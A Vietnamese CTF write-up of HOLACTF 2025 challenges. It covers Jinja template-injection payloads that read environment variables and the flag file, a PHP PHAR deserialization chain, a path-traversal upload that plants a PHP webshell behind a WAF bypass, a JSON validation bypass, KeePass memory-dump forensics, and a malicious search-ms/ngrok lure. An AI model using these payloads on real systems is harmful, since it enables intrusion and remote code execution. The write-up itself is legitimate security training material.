preimage: [dnre<ne3_(._a})>)to{)_}d.sil]__s(>_i___])3_52_nlg_to_r_dtcd(._-piieraon__inr3r()_3)_s_d)o_a(r{)_.__3o].b(d()s).n__e(s1_.sn)b[ii_e[(.a).t[.(.sp<((__...s5a_ed2_i_a_]_t_r_3i_cs)_p_p_gg__(l_l
<i>No magic name &lt;module &#39;sys&#39; (built-in)&gt; here, try again!</i>
```

3. Lấy `os` qua `sys.modules['os']`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].__repr__()}}"
preimage: _snrlo>.__)_>d.5pe)(_n_.(_o)}i_bes(ii_b_]rd)(a}ca_)s>)et).(5)ldnr3t_e3nns3_s3___.3((({_d.d(t_)__d<_e]ae(.o)i2.)_.r_il__)p_(l)o](pr(de((e_5r_i_mnno_a_{_)o._pd_s_e<a)ro).]ersd_.s]_an.__r([n3]_guip.[[()s[2<.-3t_.pi[____1]a[)(_a31_g(_rl3t))(ci_()2._dgd_(_)sr.[__n__
<i>No magic name &lt;module &#39;os&#39; (frozen)&gt; here, try again!</i>
```

4. Đọc `ENV`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].environ.__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].environ.__repr__()}}"
preimage: e(._.[_e_v-s2s_3g]e_o.e___.)})_.ri)sl3b.ea_))p}l)pa_(__n[_nret3))i_tr(_(tids_.smlra.s)__c__.2..n{3_((__i(>>ep(ipnl)nrs]]d[o_()__r)3())_[5__donnr).2<._)_{o.(a_(rta3_)(31(e__d(]t_i>e_[..(e3_3).s___(pa_[r_(5_oi]n._dpd1e.__b_dn]_r(n)5is]_so_n)(d<(c<dlr(_odad_r__i))[ounggai
<i>No magic name environ({&#39;KUBERNETES_SERVICE_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT&#39;: &#39;tcp://10.100.0.1:443&#39;, &#39;HOSTNAME&#39;: &#39;magic-random-ea5710c0c1194be0&#39;, &#39;PYTHON_PIP_VERSION&#39;: &#39;24.0&#39;, &#39;SHLVL&#39;: &#39;1&#39;, &#39;HOME&#39;: &#39;/app&#39;, &#39;GPG_KEY&#39;: &#39;7169605F62C751356D054A26A821E680E5FA6305&#39;, &#39;PYTHON_GET_PIP_URL&#39;: &#39;https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py&#39;, &#39;KUBERNETES_PORT_443_TCP_ADDR&#39;: &#39;10.100.0.1&#39;, &#39;PATH&#39;: &#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39;, &#39;KUBERNETES_PORT_443_TCP_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP_PROTO&#39;: &#39;tcp&#39;, &#39;LANG&#39;: &#39;C.UTF-8&#39;, &#39;PYTHON_VERSION&#39;: &#39;3.12.2&#39;, &#39;KUBERNETES_SERVICE_PORT_HTTPS&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP&#39;: &#39;tcp://10.100.0.1:443&#39;, &#39;KUBERNETES_SERVICE_HOST&#39;: &#39;10.100.0.1&#39;, &#39;PWD&#39;: &#39;/app&#39;, &#39;PYTHON_GET_PIP_SHA256&#39;: &#39;dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9&#39;, &#39;GZCTF_TEAM_ID&#39;: &#39;1250&#39;, &#39;WERKZEUG_SERVER_FD&#39;: &#39;3&#39;}) here, try again!</i>
```

5. Liệt kê các file có trong `/app`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))}}"
preimage: d_0[a(>(n_>]._gi.i_35r___1<t)).(_aa>itd_{_d]tn)_<n)_.._5<)nar3_(r()__sbt_gstl.e_(p[_i.[.ili[)__l3_es)(g_rmsr.p_1sg2s(n_e__.__e_.rn(._3._poe[(___{(n_(dpd(gdn(iie5_a.d5ol__s(i)d3[.]_)]se22__[as3_a___de.._ionco_ssood__n_))esr).)oiadod]_b>_ip_[_(p)lt3.no_ari-ceb_n_s((_.d__t(o___.__l]at._iln_ii_i_e)d.csess)))(_b)_os)3___rt_)13))i_.nr2o_o]r_l_a[_idn(r_esg.s(ai_d_u(i..r_idls_sbi(3)_gno2]op))(2o_.]il___)ss](p_.-ec_p..en<_)(i)n_cs__-.._]_e}._ga3a}(ndnl[[_ir(_rag(sld__s  
<i>No magic name [&#39;flag_3i3Bqp92KMSCXkT.txt&#39;, &#39;static&#39;, &#39;templates&#39;, &#39;app.py&#39;] here, try again!</i>
```

6. Đọc file flag trong `/app`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].O_RDONLY),8192)}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].O_RDONLY),8192)}}"
preimage: _s[_3a()_3o(e)(n_.l()cn)ac_n_p.l2)s__.as__0nl__t2__-_]de__[_i_{ar_l_3_(d(N_irp<s(_i[.ssne_]_.__r<-ll()l3n).o(og.()t}de(_3<[(oe)]_r_3[___g_1_igb3r2abr3)r_._.elo(se)]3_dc()])))n)it]cro_i)pn}t5tnn_(__d_s)rs___][_idn.cp.d)a__rnua_a_)_o_sst])_(.dee<n__s.o3_p)b)_i_((i_o3_l__[_oia__i3_ad(<s._l.io<d(_(rt1[lnno)s>i.o(s(()_))s(.dr_)R).r_i].i[..._mgl_i[._9g_(1s_psno)g)[())t_n3._1.((b_oo-ti_)__(earpn))_(ede3_(sa[][]s._(ap].cds_>op__)_gi.b_(()Yg.i_<_r_pi_)cple(]2sd{_o>di)_a_l2lrad<_ps_o(e.on3g__d__o[_is)(_(__(us__-p_b_(()_,_3]elgngral5gg___]>idrin_.pr3)a]_(s3.sd><abd_sidsn[dse5_o__o_(e.(5._e_i___n)((r_agd___)_n).___r_2easie.o_._(_.)s((.8emb__u__]__)_[gidl_ge_e()n.r_a2_ed_a]_3s_lcbt_(3[(p.[.o_e_sg_nn.2s__o_s_.ea__rn0_]d__(endo_3_epor-e).s_r>as2i_ds_rrisiei_asa__to_],_ip_i).d[2]n)(5rnroi._ls(__ei_3()d.___n__s.r)_b_r_c(pc>1(_).._r[_)s.t(___n[toi)[.0)(i3__i)is_ii(a_e_.0i__ii(._oa.r.)._s_._._i_(3(_.e_(ie)sngn(i_>a3.[__1r(.ot.n[]-a___ai_n_)nni..dl__[i.sin)lp])i5pn(_3.nmp3(t__5oe2_css]_>o(_.1diobsr_(n(si_lr._sl_(e[db.enppd(_rnrddp())_n.)_)ae_a]ep)<).__p[-a3oeeaas2)o_s__s>p5s.[snd_>t_._(e.n)a5t[ai))io>s2_5______i_<o.d3.)i..i___d(n_)lb3_.(d)_o)_o_e.[().(a]3_s_nee.](n)ddt(.2._[sd_<3r-_onc(ngrt]O__i5_ri_o_da()igcp_<n2i3aot.l<____dasg.)en(ct(s[g)dL(o]eie.gp).n___l[t[ugdd1oi.)dl_tsrd(ir)5]_.e_atgda_(_ri_.rg)t_d]O_(___[__[(___d.ea._sn]_d((3_]2_.])l.)abs2[(os5m_)i__s].lnr__n3(1_)13(_)3)(i_l_.ediic_)3Dd2e_asta_dd_s_nl]r._oo)st_._.2s___.sp]l_3[1s.()__r___s..ia(nn5>)n_.)d().._ld)d.ad(_3]e)s(nd)t___>)be_drl_
<i>No magic name b&#39;HOLACTF{cRea73_YoUr_MA6iC_27cbffcbaedd}}\n&#39; here, try again!</i>
```
`FLAG: HOLACTF{cRea73_YoUr_MA6iC_27cbffcbaedd}`

### WEB - hell_ehc

```text
Author
perrito

Description
Boring fact: The original name of this challenge is your PHARts stinks.
```

Bài này sẽ khai thác đọc `HOLACTF{...}` bằng cách lợi dụng việc `unserialize()` cookie và việc gọi `md5_file()` trên đường dẫn `phar://`.

#### Tổng quan

- Web xử lý cookie `user` bằng `unserialize()` với `allowed_classes=['User','LogFile']`.
    
    `home.php`
    
    ```php
    $info = unserialize(base64_decode($_COOKIE['user']), ['allowed_classes' => ['User', 'LogFile']]);
    ```
    
    `view_avatars.php`
    
    ```php
    $info = unserialize(base64_decode($_COOKIE['user']), ['allowed_classes' => ['User', 'LogFile']]);
    ```
    
    `upload.php`
    
    ```php
    $info = unserialize(base64_decode($_COOKIE['user']), ['allowed_classes' => ['User', 'LogFile']]);
    ```
    
- Class `LogFile` có `__destruct()` gọi `md5_file($this->filename)`.
    
    `LogAndCheck.php`
    
    ```php
    class LogFile
    {
        public $filename;
    
        public function __destruct()
        {
            return md5_file($this->filename);
        }
    }
    ```
    
- Khi `md5_file()` mở một đường dẫn `phar://…`, PHP **unserialize metadata** trong PHAR. Bước này **không bị** `allowed_classes` giới hạn.
- Đặt một object “gadget” trong metadata (ví dụ `Logger` có `__destruct()` ghi dữ liệu vào file công khai).
    
    `LogAndCheck.php` (sẵn class `Logger` trong app, phục vụ gadget)
    
    ```php
    class Logger
    {
        public function __destruct()
        {
    ...
    ```
    
- Ghi PHP vào `logMD5.php`, sau đó truy cập file để `readfile('/flag.txt')`.
    
    Hàm log sẵn có của ứng dụng:
    
    `LogAndCheck.php`
    
    ```php
    function checkMd5AndLog($md5Hash)
    {
        if (strlen($md5Hash) !== 32 || !ctype_xdigit($md5Hash)) {
            return;
        }
        $file = 'logMD5.php';
    
        if (!file_exists($file)) {
            touch($file);
        }
    
        $entry = $md5Hash . PHP_EOL;
        file_put_contents($file, $entry, FILE_APPEND);
    }
    ```
    
    Điểm ghi MD5 vào log:
    
    `upload.php`
    
    ```php
    if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
      $getMD5 = md5_file($target_file);
      checkMd5AndLog($getMD5);
      $conn->updateAvatar($username, $fileName);
      header('Location: /?page=home');
    }
    ```
    
    Cookie định dạng `base64(serialize($user))`:
    
    `login.php`
    
    ```php
    $data = base64_encode(serialize($user));
    header("Set-Cookie: user=$data");
    header("Location: /?page=home");
    ```
    

---

#### Chuỗi khai thác

1. Đăng ký và đăng nhập để có thư mục `upload/testq/`.
2. Tạo **PHAR–GIF polyglot**. Metadata chứa object `Logger` sao cho destructor append PHP vào `logMD5.php`.
3. Upload `avatar.gif` vào `upload/testq/avatar.gif`.
4. Tạo cookie `user` là object `LogFile` trỏ tới `phar://upload/testq/avatar.gif/a`.
5. Gọi trang có `unserialize(cookie)` để kích hoạt:
    - `LogFile->__destruct()` → `md5_file('phar://…')` → parse PHAR → **unserialize metadata**.
    - `Logger->__destruct()` chạy và **append** PHP vào `logMD5.php`.
6. Truy cập `logMD5.php` để in flag.

#### Tạo PHAR–GIF polyglot

```php
<?php
class Logger { public $logs; public $request; }

$payload = new Logger();
$payload->logs    = 'logMD5.php';
$payload->request = '<?php readfile("/flag.txt"); ?>';
@unlink('p.phar');
$phar = new Phar('p.phar');
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($payload);
$phar->addFromString('a', 'x');
$phar->stopBuffering();
rename('p.phar','avatar.gif');
```

```
php -d phar.readonly=0 build_phar.php
```

Upload file avatar: `avatar.gif`

#### Tạo cookie

```bash
PS C:\Users\biscuit\Desktop> $phar = 'phar://upload/testq/avatar.gif/a'
PS C:\Users\biscuit\Desktop> $len = [Text.Encoding]::UTF8.GetByteCount($phar)
PS C:\Users\biscuit\Desktop> $ser = 'O:7:"LogFile":1:{s:8:"filename";s:' + $len + ':"' + $phar + '";}'
PS C:\Users\biscuit\Desktop> $cookie = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ser))
PS C:\Users\biscuit\Desktop> & "$env:SystemRoot\System32\curl.exe" -s `
>>   -H "Cookie: user=$cookie" `
>>   "http://127.0.0.1:59925/?page=view_avatars"
PS C:\Users\biscuit\Desktop> Invoke-WebRequest -UseBasicParsing `
>>   -Uri "http://127.0.0.1:59925/?page=view_avatars" `
>>   -Headers @{ Cookie = "user=$cookie" }

StatusCode        : 200
StatusDescription : OK
Content           :

                    <!DOCTYPE html>
                    <html lang="en" dir="ltr">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title> Login </title>
                        <style>...
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    Connection: keep-alive
                    Content-Type: text/html; charset=UTF-8
                    Date: Sat, 30 Aug 2025 05:55:40 GMT
                    Server: nginx
                    X-Powered-By: PHP/7.4.0

                    <!DOCTYP...
Forms             :
Headers           : {[Transfer-Encoding, chunked], [Connection, keep-alive], [Content-Type, text/html; charset=UTF-8], [Date, Sat,
                    30 Aug 2025 05:55:40 GMT]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="/?page=register">Register now</a>; tagName=A; href=/?page=register}}
ParsedHtml        :
RawContentLength  : 3513
```

#### Flag

```powershell
PS C:\Users\biscuit\Desktop> & "$env:SystemRoot\System32\curl.exe" -s "http://127.0.0.1:59925/logMD5.php"
01865ef3919e542a1a0fdc04313a5433
d304cc0f95860c2799b0a4e91b467f68
0764f8c8d680bb675f87e3f1a892a4b8
eccfb18a53ac83c6a4560d3fb7a21c30
eccde4803614947511bd1af76d1930e6
63a4ecf57394c8e85ecc817941453343
HOLACTF{I_love_EHCCCCC_cdfdcc941c4f}
PS C:\Users\biscuit\Desktop>
```
`FLAG: HOLACTF{I_love_EHCCCCC_cdfdcc941c4f}`

### WEB - another_hell_ehc

```text
Author
perrito

Description
I just create a new challenge with the same source code because i'm too lazy :((
```

#### Username có thể traversal để ghi ra docroot

`login.php` đặt `$_SESSION["username"]` từ input, chỉ strip tags. Không chặn `../`.

```php
// login.php
$username = htmlspecialchars(strip_tags($username));
...
if ($conn->login($username, $password)) {
    $_SESSION["username"] = $username;
    $_SESSION["loggedin"] = true;
}
```

`upload.php` dùng trực tiếp `$_SESSION['username']` để tạo thư mục lưu file.

```php
// upload.php
$target_dir = "upload/" . $_SESSION['username'] . "/";   // <-- traversal tại đây
if (!is_dir($target_dir)) {
  mkdir($target_dir, 0777, true);
}
```

→ Đặt username = `../../../../../var/www/html` sẽ khiến file được ghi vào `/var/www/html/…`.

#### Sai logic lấy đuôi file có thể dùng `.jpg.phtml`

`upload.php` lấy đuôi bằng phần tử **thứ hai** sau `.` thay vì phần tử cuối.

```php
// upload.php
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
...
$fileExt = explode('.', basename($fileName))[1]; //chỉ lấy sau dấu chấm đầu tiên
if (!in_array($fileExt, $allowedExtensions)) {
  exit("Sorry, your file type is not allowed.");
}
```

→ Tên `rce.jpg.phtml` cho `fileExt = 'jpg'` nên qua allowlist. File thực tế là PHP vì đuôi cuối `.phtml` vẫn được Apache parse.

#### Bypass WAF

`nginx.conf` chỉ gọi WAF khi chuỗi query chứa đúng `page=upload`. WAF chỉ gắn vào `page=upload` có thế bypass dùng `%75` :

```conf
# nginx.conf
location / {
    if ($args ~ "page=upload") {
        access_by_lua_file /usr/local/openresty/nginx/lua/waf.lua;
    }
    proxy_pass http://127.0.0.1:8080/;
}
location /upload { deny all; return 403; }
```

→ Gọi `/?page=%75pload` thì PHP decode thành `upload` nhưng Nginx không khớp regex nên WAF sẽ không hoạt động.

#### WAF có allowlist đuôi ảnh, block `.php|.phtml`

(bị vô hiệu do bypass ở bước vừa rồi)

```lua
-- waf.lua
local filename = body:match('filename="([^"]+)"')
local ext = filename:match("%.([^.]+)$")  -- lấy đuôi CUỐI
local allowed = { jpg=true, jpeg=true, png=true, gif=true }
if not allowed[ext:lower()] then
    ngx.status = 403
    ngx.say("Blocked: file extension not allowed - " .. ext)
    return ngx.exit(403)
end
```

#### Router include theo `page`

```php
// index.php
$regex="/(secret|proc|environ|access|error|\.\.|\/|,|;|[|]|\|connect)/i";
if(isset($_GET['page']) && !empty($_GET['page'])) {
  if(!preg_match_all($regex,$_GET['page'])) {
    // (đoạn thêm .php rồi include)
    if(file_exists($page)) { include($page); }
  }
} else {
  header("Location: /?page=home.php");
}
```

Gọi trực tiếp `/rce.jpg.phtml` vì file đã được ghi thẳng vào docroot do trước đấy dùng path traversal.

```bash
PS C:\Users\biscuit\Desktop>
PS C:\Users\biscuit\Desktop> $BASE = 'http://127.0.0.1:63936'
PS C:\Users\biscuit\Desktop> $U    = '../../../../../var/www/html'   # traversal tới /var/www/html
PS C:\Users\biscuit\Desktop> $P    = 'p@ssw0rd'
PS C:\Users\biscuit\Desktop> curl.exe -s -c c.txt -X POST "$BASE/?page=register" --data-urlencode "username=$U" --data-urlencode "password=$P"
PS C:\Users\biscuit\Desktop> curl.exe -s -b c.txt -c c.txt -X POST "$BASE/?page=login"    --data-urlencode "username=$U" --data-urlencode "password=$P"
PS C:\Users\biscuit\Desktop> # tạo webshell
PS C:\Users\biscuit\Desktop> Set-Content -Path .\s.php -Value '<?php system($_GET["c"]); ?>' -Encoding ASCII -NoNewline
PS C:\Users\biscuit\Desktop> # upload qua đường tắt WAF: page=%75pload
PS C:\Users\biscuit\Desktop> # lấy đuôi = 'jpg'
PS C:\Users\biscuit\Desktop> curl.exe -s -b c.txt -F "avatar=@s.php;type=image/jpeg;filename=rce.jpg.phtml" "$BASE/?page=%75pload"
PS C:\Users\biscuit\Desktop> # RCE và đọc flag 
PS C:\Users\biscuit\Desktop> curl.exe -G -s --data-urlencode "c=whoami"         "$BASE/rce.jpg.phtml"
www-data
PS C:\Users\biscuit\Desktop> curl.exe -G -s --data-urlencode "c=cat /flag.txt"  "$BASE/rce.jpg.phtml"
HOLACTF{I_really_love_EHCCCCC_b3c78f2d5c35}
PS C:\Users\biscuit\Desktop>
```
`FLAG: HOLACTF{I_really_love_EHCCCCC_b3c78f2d5c35}`

### WEB- Sanity check

```text
Author
ductohno

Description
Chào mừng bạn ghé thăm website “vibe coding” của mình! Thực ra mình dựng nó chỉ để test xem server cần oxi không thôi, nhưng ở đâu đó vẫn có vài lỗi nho nhỏ đang ẩn mình. Liệu bạn có tìm ra chúng không?
```

Mình thấy ở `/update` duyệt sẽ check valid input như sau: duyệt `for char in data['data']` rồi ép `int(char)` ∈ {0,1}. Nếu `data['data']` là dict thì vòng lặp đi qua **key**. Nên mình sẽ tạo đúng 512 key sao cho `int(key)` luôn là 0 hoặc 1, rồi gắn một value chứa `"Holactf"`. Server lưu `str(dict)` vào file nên chuỗi `"Holactf"` xuất hiện. `/get_flag` chỉ cần `"Holactf" in data` nên trả flag.

```python
def is_valid_input(input):
    """Check if input is valid or not"""
    if input == '' or len(input) != NUMBER_OF_BITS:
        return False
    try:
        for char in input:
            if int(char) != 0 and int(char) != 1:
                return False
    except ValueError:
        return False
    return True
```

```python
@app.route('/update', methods=['POST'])
@is_User_Exist
def update():
    try:
        data = request.json
        if(not is_valid_input(data['data'])):
            return jsonify({'error':'Invalid input'})
        save_to_file(data['data'], get_user_filename())
        return jsonify({'status': 'updated', 'new_state': data['data']})
    except Exception as e:
        return jsonify({'error':e})
```

Script tạo `data`:

```python
import json

BITS = 512
HALF = BITS // 2

def zeros_block(n):
    return { '0'*(i+1): 0 for i in range(n) }

def ones_block(n):
    return { ('0'*i)+'1': 1 for i in range(n) }

def build():
    m = zeros_block(HALF)
    m.update(ones_block(HALF))
    m['0'] = 'Holactf'          # trigger
    return {"data": m}

if __name__ == "__main__":
    print(json.dumps(build()))
```

![image](https://hackmd.io/_uploads/B1Tdf8-qgx.png)

sau đó mình Intercept request để đổi `data` mình vừa gen ra:

![image 1](https://hackmd.io/_uploads/rkwKzLZceg.png)

Và access tới `/get_flag` để đọc flag:

![image 2](https://hackmd.io/_uploads/SJGsG8b5ge.png)

`FLAG: HOLACTF{a_C0NciDeNT_h4pP3n_3dd3c5938c2b}`

## Forensics
### First step into forensics
Ở bài này mình được cung cấp 3 file, 1 file minidump Keepass, 1 file Keepass database, và 1 file zip có mật khẩu. Với context được cung cấp là `strings + grep`, mình đoán ngay được flow của bài này là `strings + grep` lấy pass cho file `infected.kdbx`, mở file đó lấy pass cho file zip, rồi lại `strings + grep` lấy flag trong file minidump cuối. Và đó là cách 1, cách 2 thì các bạn k cần phải `strings + grep`.

Load `infected.dmp` vào **Windbg**. Tận dụng class `KeePassLib.Security.ProtectedString`, một class chịu trách nhiệm lưu trữ mật khẩu người dùng dưới dạng bảo vệ (protected) trong KeePass.
Dùng `!dumpheap -type KeePassLib.Security.ProtectedString` để lấy địa chỉ của các object thuộc class trong memory.
```
!DumpHeap /d -mt 00007ffa49031b90
         Address               MT     Size
0000000002dd90e0 00007ffa49031b90       40     
0000000002dd9108 00007ffa49031b90       40     
0000000002f7e500 00007ffa49031b90       40     

Statistics:
              MT    Count    TotalSize Class Name
00007ffa49031b90        3          120 KeePassLib.Security.ProtectedString
```
Sau đó, dùng `!DumpObj /d <address>` để dump object tại địa chỉ đó ra bao gồm class name và các variables của chúng.
```
!DumpObj /d 0000000002f7e500
Name:        KeePassLib.Security.ProtectedString
MethodTable: 00007ffa49031b90
EEClass:     00007ffa48786f40
Size:        40(0x28) bytes
File:        E:\KeePass Password Safe 2\KeePass.exe
Fields:
              MT    Field   Offset                 Type VT     Attr            Value Name
00007ffa49031d00  4001383        8 ...y.ProtectedBinary  0 instance 0000000000000000 m_pbUtf8
00007ffafed507a0  4001384       10        System.String  0 instance 0000000002fba5d8 m_strPlainText
00007ffafed4c638  4001385       1c       System.Boolean  1 instance                1 m_bIsProtected
00007ffafed53368  4001388       18         System.Int32  1 instance               25 m_nCachedLength
00007ffa49031b90  4001386     2660 ...y.ProtectedString  0   static 0000000002dd90e0 m_psEmpty
00007ffa49031b90  4001387     2668 ...y.ProtectedString  0   static 0000000002dd9108 m_psEmptyEx
```
Ở đây ta quan tâm đến `m_strPlainText`, đây là biến đóng vai trò giữ tham chiếu trực tiếp tới object `System.String` chứa chuỗi mật khẩu dạng plaintext mà người dùng đã nhập.
Tới đây thì chỉ cần dump object tại địa chỉ của `m_strPlaintext` ra là xong.
```
!DumpObj /d 0000000002fba5d8
Name:        System.String
MethodTable: 00007ffafed507a0
EEClass:     00007ffafed04868
Size:        76(0x4c) bytes
File:        C:\WINDOWS\Microsoft.Net\assembly\GAC_64\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll
String:      first_stage_of_this_chall
```
Ta có được password của Keepass password database: **first_stage_of_this_chall**
![image](https://hackmd.io/_uploads/rJmHjIW5ex.png)
Copy password có Title là `infected`, đó là password của file zip: **chaomungtoiholactf2025kekw*88***
Dùng password để unlock file zip, load file dmp vào Hxd, và tìm chuỗi `HOLACTF{`:
![image](https://hackmd.io/_uploads/B103sL-cgg.png)
Flag: `HOLACTF{Oeocam_to_HolaCTF2025!!!!}`

### APT
![image](https://hackmd.io/_uploads/H1rp3PWqxx.png)
Hiện vật là một file ad1 mở bằng FTKimage để phân tích 
Ở Question 1 thì theo như mô tả nạn nhân nhận được một file nên mình có thể suy đoán người dùng nhận được mail hoặc thông qua browser thì check trong user tmp có thấy được người dùng sử dụng ThunderBird và check các mail của user thì thấy có một email nghi ngờ 
>Hiện vật : %APPDATA%/Roaming/Thunderbird/Profiles/<profile>/Mail/pop.gmail.com/INBOX

[+] Phân tích file mail với thunderbird ta thấy một mail hieutrungnguyen0702@gmail.com có gửi một file cho nạn nhân đi kèm với password
![image](https://hackmd.io/_uploads/rJQ31_Zclx.png)
Trích xuất file ra giải nén và phân tích ta thấy đây là một  tệp html độc hại "diemchuan.html"
![code](https://hackmd.io/_uploads/Sk_TGOWqlg.png)
Giải mã chuỗi payload ta được một chuỗi Downloads được host trên ngrok 
```
search-ms:query=Ket_Qua_Ky_Thi_THPTQG2036&crumb=location:\\5b4a29dffc4d.ngrok-free.app@SSL\DavWWWRoot\&displayname=Downloads
```
và một cái url file giff trong tag style
```
https://files.sakamoto.moe/cba5703ee7fd_word.gif
```
Kiểm tra url thì thấy đó là một ảnh chụp từ word với dòng chữ hidden content khá là bí ẩn nên tôi sẽ tiến hành check 2 domain này trong Logs windows xem có để lại manh mối nào không 
Tôi đã sử dụng bộ công cụ của eric zimmerman dùng PECmd.exe cho phân tích Prefetch folder và EvtxCmd.exe cho phân tích logs và dùng TimelimeExplorer để đọc các logs trả về 
